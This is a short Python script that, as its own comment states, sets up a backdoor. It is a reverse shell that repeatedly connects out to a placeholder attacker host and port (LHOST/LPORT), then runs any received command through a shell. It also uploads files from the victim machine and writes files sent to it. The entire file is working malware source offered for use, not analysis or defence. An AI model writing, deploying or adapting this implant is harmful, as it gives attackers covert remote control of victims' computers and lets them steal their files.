import socket
import time
import json
import subprocess
import os
    
def reliable_send(data):
    jsondata = json.dumps(data)  # Convert data to JSON format
    s.send(jsondata.encode())  # Send the JSON data to the target

def reliable_recv():
    data = ''  # Initialize an empty string to hold received data
    while True:
        try:
            data += s.recv(1024).decode().rstrip()  # Receive data in chunks of 1024 bytes
            return json.loads(data)  # Convert the received JSON data back to Python object
        except ValueError:
            continue

def connection():
    while True:
        try:
            time.sleep(20)  # Wait for 20 seconds before trying to connect
            s.connect(('LHOST', 'LPORT'))  # Replace 'localhost' and 9999 with the desired host and port
            shell()
            s.close()
            break
        except:
            connection()

def download_file(file_name):
    f = open(file_name, 'wb')  # Open the file in binary write mode
    s.settimeout(1)  # Set a timeout for receiving data
    chunk = s.recv(1024)  # Receive data in chunks of 1024 bytes
    while chunk:
        f.write(chunk)  # Write the received chunk to the file
        try:
            chunk = s.recv(1024)  # Continue receiving data until no more data is sent
        except socket.timeout as e:  # If a timeout occurs, break the loop
            break
    s.settimeout(None)  # Reset the timeout
    f.close()  # Close the file after writing

def upload_file(file_name):
    f = open(file_name, 'rb')  # Open the file in binary read mode
    s.send(f.read())  # Send the file content to the target
    f.close()  # Close the file after sending

def shell():
    while True:
        command = reliable_recv()
        if command == 'exit':
            break
        elif command == 'clear':
            os.system('clear')  # Clear the console
        elif command[:3] == 'cd ':
            os.chdir(command[3:])  # Change directory
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)
# This code sets up a backdoor that connects to a specified host and port, allowing remote command execution.

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()